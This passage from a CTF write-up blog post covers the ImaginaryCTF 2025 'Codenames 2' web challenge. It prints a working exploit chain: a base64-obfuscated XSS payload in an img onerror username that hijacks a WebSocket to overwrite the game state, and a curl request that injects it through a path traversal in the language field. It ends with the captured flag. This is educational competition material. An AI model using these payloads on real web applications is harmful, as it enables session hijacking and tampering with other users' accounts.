<span class="nx">s</span> <span class="o">=</span> <span class="nf">io</span><span class="p">({</span><span class="na">query</span><span class="p">:</span> <span class="dl">"</span><span class="s2">code=</span><span class="dl">"</span> <span class="o">+</span> <span class="p">});</span> 

<span class="c1">// Every 5 seconds, emit a clue that will overwrite</span>
<span class="c1">// the game["guesses_remaining"], setting it to 100</span>
<span class="nf">setInterval</span><span class="p">(</span>
    <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> 
        <span class="nx">s</span><span class="p">.</span><span class="nf">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">give_clue</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> 
            <span class="na">clue</span><span class="p">:</span> <span class="dl">"</span><span class="s2">PWNED</span><span class="dl">"</span><span class="p">,</span> 
            <span class="c1">// Set a high number of guesses</span>
            <span class="na">number</span><span class="p">:</span><span class="mi">100</span> 
        <span class="p">})</span> 
    <span class="p">},</span> <span class="mi">5000</span>
<span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I put the payload on one line, and simplify it a bit:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">s</span> <span class="o">=</span> <span class="nf">io</span><span class="p">({</span><span class="na">query</span><span class="p">:</span> <span class="dl">"</span><span class="s2">code=</span><span class="dl">"</span> <span class="o">+</span> <span class="nc">String</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">).</span><span class="nf">slice</span><span class="p">(</span><span class="o">-</span><span class="mi">6</span><span class="p">)});</span> <span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="nx">s</span><span class="p">.</span><span class="nf">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">give_clue</span><span class="dl">"</span><span class="p">,{</span> <span class="na">clue</span><span class="p">:</span> <span class="dl">"</span><span class="s2">PWNED</span><span class="dl">"</span><span class="p">,</span> <span class="na">number</span><span class="p">:</span><span class="mi">100</span> <span class="p">})</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Bas64 encode it, and put it in an <code class="language-plaintext highlighter-rouge">eval</code>:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">eval</span><span class="p">(</span><span class="nf">atob</span><span class="p">(</span><span class="s2">`cyA9IGlvKHtxdWVyeTogImNvZGU9IiArIFN0cmluZyh3aW5kb3cubG9jYXRpb24pLnNsaWNlKC02KX0pOyBzZXRJbnRlcnZhbChmdW5jdGlvbigpeyBzLmVtaXQoImdpdmVfY2x1ZSIseyBjbHVlOiAiUFdORUQiLCBudW1iZXI6MTAwIH0pIH0sIDUwMDAp`</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Why using an eval ? The payload contains a lot of <code class="language-plaintext highlighter-rouge">.</code>, and <code class="language-plaintext highlighter-rouge">.</code> are filtered by the backend:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="ow">not</span> <span class="n">language</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">language</span><span class="p">:</span>
    <span class="n">language</span> <span class="o">=</span> <span class="n">LANGUAGES</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">LANGUAGES</span> <span class="k">else</span> <span class="bp">None</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So the final payload will be to signup with this username:</p>
<div class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">'eval(atob(`cyA9IGlvKHtxdWVyeTogImNvZGU9IiArIFN0cmluZyh3aW5kb3cubG9jYXRpb24pLnNsaWNlKC02KX0pOyBzZXRJbnRlcnZhbChmdW5jdGlvbigpeyBzLmVtaXQoImdpdmVfY2x1ZSIseyBjbHVlOiAiUFdORUQiLCBudW1iZXI6MTAwIH0pIH0sIDUwMDAp`))'</span><span class="nt">&gt;</span>.txt
</pre></td></tr></tbody></table></code></div></div>

<h5 id="using-the-payload"><span class="me-2">Using the payload</span><a href="#using-the-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>I start by creating the user:</p>

<p><a href="/assets/img/writeups/ImaginaryCTF/signup.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/signup.png" alt="index"  loading="lazy"></a>
<em>Sign up with malicious user</em></p>

<p>Then I create a game in hard mode with my payload like this:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-X</span> POST <span class="s1">'http://34.72.72.63:37548/create_game'</span> <span class="se">\</span>
  <span class="nt">-H</span> <span class="s2">"Cookie: session=.eJwNzU1vgjAAgOG_YrioybIgziWYuQQxQgdCZPIhl9nSCmUtNBQQtuy_j8N7eg7vr0LlF6pbZXuHTJInpZOkqSAnylZ5ozyfySbbDbO6Ik1TN7s56SFbwLZGi1s2GjqwWO_Y7YDjaCSXOgfc61Mr1AE1GnD01IyzLh2LNYw332iddcjSy2sSCKS9CLfyJIw95piq5iSq8Mf9T5oEH6gKWFalBTILjuNNiacHorkgk7s8amFyrgHHAvPoftWGVfoJ5GQlsiPmU4OGR-wH4Zm65r7D8YqmCXg9XYwHsFUxJcEhfJwOhrgtl_P353Zolb9_Xkta9g.aL29RQ.qHqfiySOrFC5oxE6cZbubENY5Jg"</span> <span class="se">\</span>
  <span class="nt">-d</span> <span class="s2">"language=/app/profiles/&lt;img src=x onerror='eval(atob(</span><span class="se">\`</span><span class="s2">cyA9IGlvKHtxdWVyeTogImNvZGU9IiArIFN0cmluZyh3aW5kb3cubG9jYXRpb24pLnNsaWNlKC02KX0pOyBzZXRJbnRlcnZhbChmdW5jdGlvbigpeyBzLmVtaXQoImdpdmVfY2x1ZSIseyBjbHVlOiAiUFdORUQiLCBudW1iZXI6MTAwIH0pIH0sIDUwMDAp</span><span class="se">\`</span><span class="s2">))'&gt;&amp;hard_mode=1"</span>
</pre></td></tr></tbody></table></code></div></div>

<div file="response" class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="response"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">en</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You should be redirected automatically to the target URL: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/game/DBNAOZ"</span><span class="nt">&gt;</span>/game/DBNAOZ<span class="nt">&lt;/a&gt;</span>. If not, click the link.
</pre></td></tr></tbody></table></code></div></div>

<p>I access <a href="http://34.72.72.63:15703/game/DBNAOZ"> in my browser</a>, and hit the <kbd>Add bot</kbd> button:</p>

<p><a href="/assets/img/writeups/ImaginaryCTF/add_bot.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/add_bot.png" alt="index"  loading="lazy"></a></p>

<p>Wait a little bit, and here we go:
<a href="/assets/img/writeups/ImaginaryCTF/game_vs_bot.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/game_vs_bot.png" alt="index"  loading="lazy"></a></p>

<p>Our exploit is successful, loke at the <code class="language-plaintext highlighter-rouge">Guesses Remaining</code>. It’s = to <strong>100</strong>.
Now I will just manually click on every word. If I click on the wrong word and get an error message like this:
<a href="/assets/img/writeups/ImaginaryCTF/lose_example.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/lose_example.png" alt="index"  loading="lazy"></a></p>

<p>I just have to open a new tab and reaccess the game link (<a href="http://34.72.72.63:15703/game/DBNAOZ">http://34.72.72.63:15703/game/DBNAOZ</a>):
<a href="/assets/img/writeups/ImaginaryCTF/reaccessing_game.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/reaccessing_game.png" alt="index"  loading="lazy"></a></p>

<p>Because like I said earlier there is no “game_ended” or “won” or “lost” variable that tracks the state of the game. There is only <code class="language-plaintext highlighter-rouge">guesses_remaining</code>, that we can overwrite via CSWSH.</p>

<h3 id="get-the-flag"><span class="me-2">Get the flag</span><a href="#get-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Eventually after clicking on almost all words, getting kicked, rejoining, clicking on another word and so on, I got this message:
<a href="/assets/img/writeups/ImaginaryCTF/congrats.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/congrats.png" alt="index"  loading="lazy"></a></p>

<p>And after hitting ok, I got the flag:
<a href="/assets/img/writeups/ImaginaryCTF/flag.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/ImaginaryCTF/flag.png" alt="index"  loading="lazy"></a></p>

<div file="flag.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="flag.txt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>ictf{insane_mind_reading_908f13ab}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/writeups/">Writeups</a>,
          <a href="/categories/ctftime2025/">CTFTime2025</a>,
          <a href="/categories/imaginaryctf/">ImaginaryCTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeups/"
            class="post-tag no-text-decoration"
          >writeups</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/xss/"
            class="post-tag no-text-decoration"
          >xss</a>
        
          <a
            href="/tags/cswsh/"
            class="post-tag no-text-decoration"
          >cswsh</a>
        
          <a
            href="/tags/path-traversal/"
            class="post-tag no-text-decoration"
          >path-traversal</a>
        
          <a
            href="/tags/flask/"
            class="post-tag no-text-decoration"
          >flask</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=ImaginaryCTF%20-%20Codenames%202%20-%20NullBrunk&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fimaginaryctf-2025-codenames-2%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=ImaginaryCTF%20-%20Codenames%202%20-%20NullBrunk&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fimaginaryctf-2025-codenames-2%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fimaginaryctf-2025-codenames-2%2F&text=ImaginaryCTF%20-%20Codenames%202%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

         
            <!-- panel -->
            <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
              <div class="access">
                

  <section id="toc-wrapper">
    <h2 class="panel-heading no-border">Event</h2>
    <ul class="content list-unstyled no-border ps-0 pb-1 ms-1 mt-2 toc-list ">
    
      <li class="toc-list-item">
        <a class="toc-link node-name--H2 img-link fw-600 blue-sidebar"> <i class="fa-solid fa-ranking-star mr-11-px"></i> 41 / 1414  </a>
      </li>

      <li class="toc-list-item no-border">
        <a class="toc-link node-name--H2 img-link fw-600" href="https://ctftime.org/event/2799" target="_blank"> <i class="fa-solid fa-link mr-11-px"></i>Link</a>
      </li>

    </ul>
  </section>





                

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/xss/">xss</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/cswsh/">cswsh</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">path-traversal</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/flask/">flask</a>
          
        </div>
      </nav>
  </section>


              </div>

              
                
                






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-1 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>

              
            </aside>
          
        </div>

        <div class="row">
          <!-- tail -->

          
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/hackday-2025-finest/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737806400"
  data-df="ll"
  
>
  Jan 25, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Finest</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Reading Source Code
      JWT Secret Key
      SQL injection
    
  
  Exploitation
    
      Understanding the JWT
      Scrip...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/knightctf-2025-baby-injection/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737388800"
  data-df="ll"
  
>
  Jan 20, 2025
</time>

              <h4 class="pt-0 my-2">KnightCTF - Baby Injection</h4>
              <div class="text-muted">
                <p>Enumeration
    
      Enumerating website
    
  
  Exploitation
    
      Getting RCE
      Getting flag
    
  




Enumeration

Enumerating website
Let’s start by accessing the index page:

We...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/brunnerctf-cake-architect/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1755878400"
  data-df="ll"
  
>
  Aug 22, 2025
</time>

              <h4 class="pt-0 my-2">BrunnerCTF - Cake Architect</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Reading Source Code
      Identifying vulnerabilities
    
  
  Exploitation
    
      Get admin
      SQLi to RCE
      Get re...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/test/">test</a>
          
        </div>
      </nav>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>


    <script>
      mermaid.initialize({
        startOnLoad: true,
        theme: 'dark',
        securityLevel: 'loose',      // autorise les tags HTML dans les labels
        flowchart: { htmlLabels: true } // parfois utile selon version
      });    
    </script>
  </body>
</html>

